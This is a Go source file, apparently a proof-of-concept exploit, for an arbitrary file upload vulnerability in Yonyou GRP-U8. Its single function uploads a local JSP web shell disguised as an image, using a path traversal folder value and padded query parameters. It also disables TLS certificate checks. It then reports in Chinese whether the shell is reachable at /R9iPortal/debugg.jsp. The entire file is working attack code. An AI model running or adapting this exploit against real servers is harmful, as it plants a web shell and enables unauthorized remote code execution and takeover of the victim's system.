package poc

import (
	"bytes"
	"crypto/tls"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"net/textproto"
	"os"
	"regexp"
	"strings"
)

func GRP_U8_UploadFile(target string) {
	url := strings.TrimRight(target, "/")
	file, err := os.ReadFile("shell.jsp")
	if err != nil {
		log.Println("[-] Error reading file:", err)
	}

	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	h := make(textproto.MIMEHeader)
	h.Set("Content-Disposition", `form-data; name="myFile"; filename="test.jpg"`)
	part, err := writer.CreatePart(h)
	if err != nil {
		log.Println("[-] Error creating part:", err)
	}
	part.Write(file)

	writer.Close()

	request, err := http.NewRequest("POST", url+"/UploadFileData?action=upload_file&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&1=1&foldername=%2e%2e%2f&filename=debugg.jsp&filename=1.jpg", body)
	if err != nil {
		log.Println("[-] Error creating request:", err)
	}
	request.Header.Set("Content-Type", writer.FormDataContentType())

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr}
	response, err := client.Do(request)
	if err != nil {
		log.Println("[-] Error sending request:", err)
	}
	defer response.Body.Close()

	responseBody, err := io.ReadAll(response.Body)
	if err != nil {
		log.Println("[-] Error reading response:", err)
	}
	reg := regexp.MustCompile("<script>")
	msg := reg.MatchString(string(responseBody))
	if response.StatusCode == http.StatusOK && msg {
		log.Println("[+] 存在用友GRP-U8任意文件上传漏洞：" + url + "/R9iPortal/debugg.jsp")
	} else {
		log.Println("[-] 不存在用友GRP-U8任意文件上传漏洞")
	}

}
